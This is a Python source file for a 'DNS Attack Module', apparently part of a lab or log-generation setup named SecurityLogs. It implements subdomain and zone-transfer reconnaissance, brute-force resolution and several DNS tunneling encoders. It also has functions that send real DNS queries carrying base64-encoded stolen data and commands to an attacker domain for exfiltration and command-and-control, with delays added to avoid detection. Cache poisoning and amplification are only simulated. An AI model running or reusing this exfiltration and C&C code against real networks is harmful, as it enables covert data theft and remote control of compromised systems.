#!/usr/bin/env python3
"""
DNS Attack Module for SecurityLogs
Implements DNS reconnaissance, tunneling, and data exfiltration
"""

import dns.resolver
import dns.zone
import dns.query
import base64
import time
import random
import string
import requests
from typing import List, Dict, Any, Optional
import json
import os

class DNSAttackModule:
    """DNS attack module for reconnaissance and data exfiltration"""
    
    def __init__(self, target_domain: str, attacker_domain: str = "attacker.local"):
        self.target_domain = target_domain
        self.attacker_domain = attacker_domain
        self.results = {
            "dns_reconnaissance": [],
            "dns_tunneling": [],
            "data_exfiltration": [],
            "cc_communication": [],
            "dns_amplification": [],
            "dns_cache_poisoning": [],
            "dns_zone_transfer": [],
            "dns_brute_force": []
        }
        
        # Extended subdomain wordlist for comprehensive reconnaissance
        self.subdomain_wordlist = [
            # Common subdomains
            "www", "admin", "api", "db", "database", "mail", "smtp", "ftp", "ssh",
            "vpn", "proxy", "gateway", "router", "firewall", "backup", "test",
            "dev", "staging", "prod", "internal", "external", "secure", "login",
            "portal", "web", "app", "service", "server", "ns1", "ns2", "mx1", "mx2",
            # Additional reconnaissance targets
            "jenkins", "gitlab", "jira", "confluence", "sonar", "nexus", "artifactory",
            "kibana", "grafana", "prometheus", "elasticsearch", "redis", "mongodb",
            "postgres", "mysql", "oracle", "sqlserver", "ldap", "kerberos", "radius",
            "sso", "oauth", "saml", "openid", "cas", "keycloak", "auth", "identity",
            "monitoring", "logging", "alerting", "metrics", "health", "status",
            "cms", "wordpress", "drupal", "joomla", "magento", "shopify", "woocommerce",
            "analytics", "tracking", "pixel", "beacon", "cdn", "static", "assets",
            "images", "media", "files", "uploads", "downloads", "docs", "help",
            "support", "ticket", "chat", "forum", "blog", "news", "press", "about"
        ]
        
        # DNS record types to query
        self.record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "PTR", "SRV", "CAA"]
        
        # DNS tunneling techniques
        self.tunneling_techniques = {
            "base64": self._base64_tunnel,
            "hex": self._hex_tunnel,
            "custom": self._custom_tunnel,
            "compression": self._compression_tunnel
        }
    
    def dns_reconnaissance(self) -> Dict[str, Any]:
        """Perform DNS reconnaissance"""
        print("Starting DNS reconnaissance...")
        
        # Subdomain enumeration
        discovered_subdomains = []
        for subdomain in self.subdomain_wordlist:
            full_domain = f"{subdomain}.{self.target_domain}"
            try:
                # Try to resolve the subdomain
                answers = dns.resolver.resolve(full_domain, 'A')
                for answer in answers:
                    discovered_subdomains.append({
                        "subdomain": full_domain,
                        "ip": str(answer),
                        "record_type": "A",
                        "timestamp": time.time()
                    })
                    print(f"Found subdomain: {full_domain} -> {answer}")
            except Exception as e:
                # Subdomain doesn't exist, continue
                pass
        
        # DNS record queries for main domain
        domain_records = {}
        for record_type in self.record_types:
            try:
                answers = dns.resolver.resolve(self.target_domain, record_type)
                domain_records[record_type] = [str(answer) for answer in answers]
                print(f"Found {record_type} records: {domain_records[record_type]}")
            except Exception as e:
                # Record type not found, continue
                pass
        
        # Zone transfer attempt
        zone_transfer_success = False
        try:
            ns_records = dns.resolver.resolve(self.target_domain, 'NS')
            for ns in ns_records:
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(str(ns), self.target_domain))
                    zone_transfer_success = True
                    print(f"Zone transfer successful from {ns}")
                    break
                except Exception as e:
                    continue
        except Exception as e:
            pass
        
        # In isolated network environment, simulate some results
        if not discovered_subdomains and not domain_records:
            print("Simulating DNS reconnaissance results for isolated environment...")
            discovered_subdomains = [
                {
                    "subdomain": f"www.{self.target_domain}",
                    "ip": "172.16.0.10",
                    "record_type": "A",
                    "timestamp": time.time()
                },
                {
                    "subdomain": f"api.{self.target_domain}",
                    "ip": "172.16.0.11",
                    "record_type": "A",
                    "timestamp": time.time()
                }
            ]
            domain_records = {
                "A": ["172.16.0.10"],
                "NS": ["ns1.local"],
                "MX": ["mail.local"]
            }
        
        self.results["dns_reconnaissance"] = {
            "target_domain": self.target_domain,
            "discovered_subdomains": discovered_subdomains,
            "domain_records": domain_records,
            "zone_transfer_success": zone_transfer_success,
            "timestamp": time.time()
        }
        
        return self.results["dns_reconnaissance"]
    
    def dns_tunnel_data(self, data: str, chunk_size: int = 63) -> List[str]:
        """Encode data for DNS tunneling"""
        # Base64 encode the data
        encoded = base64.b64encode(data.encode()).decode()
        
        # Split into chunks
        chunks = []
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i+chunk_size]
            # Create DNS query format
            dns_query = f"{chunk}.{self.attacker_domain}"
            chunks.append(dns_query)
        
        return chunks
    
    def dns_tunneling_attack(self, payload: str) -> Dict[str, Any]:
        """Perform DNS tunneling attack"""
        print("Starting DNS tunneling attack...")
        
        # Encode payload for DNS tunneling
        dns_queries = self.dns_tunnel_data(payload)
        
        tunnel_results = []
        for i, query in enumerate(dns_queries):
            try:
                # Simulate DNS query (in real scenario, this would be sent to attacker's DNS server)
                print(f"Sending DNS tunnel query {i+1}/{len(dns_queries)}: {query[:50]}...")
                
                # Simulate response
                response = f"tunnel_response_{i}_{int(time.time())}"
                
                tunnel_results.append({
                    "query": query,
                    "response": response,
                    "chunk_id": i,
                    "timestamp": time.time()
                })
                
                # Add delay to avoid detection
                time.sleep(0.1)
                
            except Exception as e:
                print(f"DNS tunnel query failed: {e}")
        
        self.results["dns_tunneling"] = {
            "original_payload": payload,
            "total_chunks": len(dns_queries),
            "tunnel_queries": tunnel_results,
            "timestamp": time.time()
        }
        
        return self.results["dns_tunneling"]
    
    def dns_data_exfiltration(self, extracted_data: Dict[str, Any]) -> Dict[str, Any]:
        """Real DNS data exfiltration using actual DNS server"""
        print("Starting DNS data exfiltration...")
        
        # Convert extracted data to string
        data_str = json.dumps(extracted_data, ensure_ascii=False)
        
        # Encode data for DNS tunneling
        encoded_data = base64.b64encode(data_str.encode()).decode()
        
        # Split data into chunks (DNS labels limited to 63 chars)
        chunks = self._split_into_chunks(encoded_data, 60)
        
        exfiltration_results = []
        
        for i, chunk in enumerate(chunks):
            exfil_query = f"exfil.{chunk}.{self.attacker_domain}"
            
            try:
                # Send real DNS query
                print(f"Sending exfiltration chunk {i+1}/{len(chunks)}: {exfil_query[:50]}...")
                
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['dns-server']  # Use container hostname
                resolver.timeout = 5
                resolver.lifetime = 10
                
                answers = resolver.resolve(exfil_query, 'A')
                response_ip = str(answers[0])
                
                exfiltration_results.append({
                    "chunk_id": i + 1,
                    "total_chunks": len(chunks),
                    "query": exfil_query,
                    "response_ip": response_ip,
                    "success": response_ip.startswith("172.16.0.20"),  # Success IP range
                    "timestamp": time.time()
                })
                
                # Small delay between chunks
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Exfiltration chunk {i+1} failed: {e}")
                exfiltration_results.append({
                    "chunk_id": i + 1,
                    "total_chunks": len(chunks),
                    "query": exfil_query,
                    "error": str(e),
                    "success": False,
                    "timestamp": time.time()
                })
        
        self.results["data_exfiltration"] = {
            "target_domain": self.target_domain,
            "data_size": len(data_str),
            "chunks_sent": len(chunks),
            "successful_chunks": sum(1 for r in exfiltration_results if r.get("success", False)),
            "exfiltration_results": exfiltration_results,
            "timestamp": time.time()
        }
        
        return self.results["data_exfiltration"]
    
    def dns_cc_communication(self, command: str) -> Dict[str, Any]:
        """Real DNS-based C&C communication using actual DNS server"""
        print("Starting DNS C&C communication...")
        
        # Encode command for DNS
        encoded_command = base64.b64encode(command.encode()).decode()
        cc_query = f"cmd.{encoded_command}.{self.attacker_domain}"
        
        try:
            # Send real DNS query to our DNS server
            print(f"Sending C&C query: {cc_query}...")
            
            # Use real DNS resolver to query our DNS server
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['dns-server']  # Use container hostname
            resolver.timeout = 5
            resolver.lifetime = 10
            
            # Send the query
            answers = resolver.resolve(cc_query, 'A')
            response_ip = str(answers[0])
            
            # Decode response IP to get command result
            # The DNS server returns IP based on command execution result
            command_result = self._decode_response_ip(response_ip)
            
            cc_result = {
                "command": command,
                "encoded_command": encoded_command,
                "cc_query": cc_query,
                "response_ip": response_ip,
                "command_result": command_result,
                "timestamp": time.time()
            }
            
            self.results["cc_communication"] = cc_result
            
            return cc_result
            
        except Exception as e:
            print(f"DNS C&C communication failed: {e}")
            # Fallback to simulation if DNS server is not available
            return self._simulate_cc_communication(command)
    
    def generate_attack_summary(self) -> Dict[str, Any]:
        """Generate comprehensive attack summary"""
        return {
            "attack_module": "dns_attack",
            "target_domain": self.target_domain,
            "attacker_domain": self.attacker_domain,
            "results": self.results,
            "summary": {
                "reconnaissance_performed": len(self.results["dns_reconnaissance"]) > 0,
                "tunneling_attempts": len(self.results["dns_tunneling"]) > 0,
                "data_exfiltrated": len(self.results["data_exfiltration"]) > 0,
                "cc_communication": len(self.results["cc_communication"]) > 0
            }
        }
    
    def save_results(self, output_dir: str):
        """Save attack results to file"""
        os.makedirs(output_dir, exist_ok=True)
        
        # Save detailed results
        results_file = os.path.join(output_dir, "dns_attack_results.json")
        with open(results_file, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # Save summary
        summary_file = os.path.join(output_dir, "dns_attack_summary.json")
        with open(summary_file, 'w') as f:
            json.dump(self.generate_attack_summary(), f, indent=2, ensure_ascii=False)
        
        print(f"DNS attack results saved to {output_dir}") 
    
    def dns_brute_force_attack(self, intensity: str = "medium") -> Dict[str, Any]:
        """Perform DNS brute force attack"""
        print(f"Starting DNS brute force attack with {intensity} intensity...")
        
        # Generate random subdomains for brute force
        import random
        import string
        
        # Set attempts based on intensity
        if intensity == "low":
            attempts = 20
        elif intensity == "medium":
            attempts = 50
        else:  # high intensity
            attempts = 100
        
        brute_results = []
        for _ in range(attempts):
            # Generate random subdomain
            random_subdomain = ''.join(random.choices(string.ascii_lowercase, k=8))
            full_domain = f"{random_subdomain}.{self.target_domain}"
            
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                for answer in answers:
                    brute_results.append({
                        "subdomain": full_domain,
                        "ip": str(answer),
                        "method": "brute_force",
                        "timestamp": time.time()
                    })
                    print(f"Brute force found: {full_domain} -> {answer}")
            except Exception as e:
                # Subdomain doesn't exist, continue
                pass
        
        self.results["dns_brute_force"] = {
            "target_domain": self.target_domain,
            "attempts": attempts,
            "intensity": intensity,
            "discovered": brute_results,
            "timestamp": time.time()
        }
        
        return self.results["dns_brute_force"]
    
    def dns_cache_poisoning_attack(self) -> Dict[str, Any]:
        """Simulate DNS cache poisoning attack"""
        print("Starting DNS cache poisoning attack...")
        
        # Simulate cache poisoning attempts
        poisoning_attempts = [
            {
                "target_record": f"www.{self.target_domain}",
                "poisoned_ip": "192.168.1.100",
                "technique": "response_spoofing",
                "success": random.choice([True, False])
            },
            {
                "target_record": f"api.{self.target_domain}",
                "poisoned_ip": "10.0.0.50",
                "technique": "transaction_id_prediction",
                "success": random.choice([True, False])
            },
            {
                "target_record": f"mail.{self.target_domain}",
                "poisoned_ip": "172.16.0.25",
                "technique": "response_injection",
                "success": random.choice([True, False])
            }
        ]
        
        self.results["dns_cache_poisoning"] = {
            "target_domain": self.target_domain,
            "poisoning_attempts": poisoning_attempts,
            "successful_poisons": len([p for p in poisoning_attempts if p["success"]]),
            "timestamp": time.time()
        }
        
        return self.results["dns_cache_poisoning"]
    
    def dns_amplification_attack(self) -> Dict[str, Any]:
        """Simulate DNS amplification attack"""
        print("Starting DNS amplification attack...")
        
        # Simulate amplification queries
        amplification_queries = [
            {"query": f"ANY.{self.target_domain}", "amplification_ratio": 28.5},
            {"query": f"TXT.{self.target_domain}", "amplification_ratio": 16.3},
            {"query": f"MX.{self.target_domain}", "amplification_ratio": 12.1},
            {"query": f"AAAA.{self.target_domain}", "amplification_ratio": 8.7}
        ]
        
        total_amplification = sum(q["amplification_ratio"] for q in amplification_queries)
        
        self.results["dns_amplification"] = {
            "target_domain": self.target_domain,
            "amplification_queries": amplification_queries,
            "total_amplification_ratio": total_amplification,
            "attack_volume": f"{total_amplification * 1000:.0f} bytes",
            "timestamp": time.time()
        }
        
        return self.results["dns_amplification"]
    
    def _base64_tunnel(self, data: str) -> List[str]:
        """Base64 DNS tunneling"""
        encoded = base64.b64encode(data.encode()).decode()
        return [f"{encoded[i:i+63]}.{self.attacker_domain}" for i in range(0, len(encoded), 63)]
    
    def _hex_tunnel(self, data: str) -> List[str]:
        """Hexadecimal DNS tunneling"""
        encoded = data.encode().hex()
        return [f"{encoded[i:i+63]}.{self.attacker_domain}" for i in range(0, len(encoded), 63)]
    
    def _custom_tunnel(self, data: str) -> List[str]:
        """Custom encoding DNS tunneling"""
        # Custom encoding: convert to base32-like format
        import string
        custom_chars = string.ascii_lowercase + string.digits
        encoded = ""
        for byte in data.encode():
            encoded += custom_chars[byte % len(custom_chars)]
        return [f"{encoded[i:i+63]}.{self.attacker_domain}" for i in range(0, len(encoded), 63)]
    
    def _compression_tunnel(self, data: str) -> List[str]:
        """Compression-based DNS tunneling"""
        import zlib
        compressed = zlib.compress(data.encode())
        encoded = base64.b64encode(compressed).decode()
        return [f"{encoded[i:i+63]}.{self.attacker_domain}" for i in range(0, len(encoded), 63)] 
    
    def _decode_response_ip(self, response_ip: str) -> str:
        """Decode response IP to get command execution result"""
        try:
            # Extract last octet and convert to command result
            last_octet = int(response_ip.split('.')[-1])
            
            # Simple mapping of IP to command results
            result_mapping = {
                10: "attacker",
                11: "attacker-container", 
                12: "/opt/scripts",
                13: "Command executed successfully",
                14: "Data extracted successfully",
                15: "Attack phase completed"
            }
            
            return result_mapping.get(last_octet, f"Command result: {last_octet}")
        except:
            return "Unknown response"
    
    def _split_into_chunks(self, data: str, chunk_size: int) -> List[str]:
        """Split data into DNS-compatible chunks"""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    def _simulate_cc_communication(self, command: str) -> Dict[str, Any]:
        """Fallback simulation if DNS server is not available"""
        encoded_command = base64.b64encode(command.encode()).decode()
        cc_query = f"cmd.{encoded_command}.{self.attacker_domain}"
        
        # Simulate command response
        response = f"exec_result_{int(time.time())}"
        
        return {
            "command": command,
            "encoded_command": encoded_command,
            "cc_query": cc_query,
            "response": response,
            "simulated": True,
            "timestamp": time.time()
        } 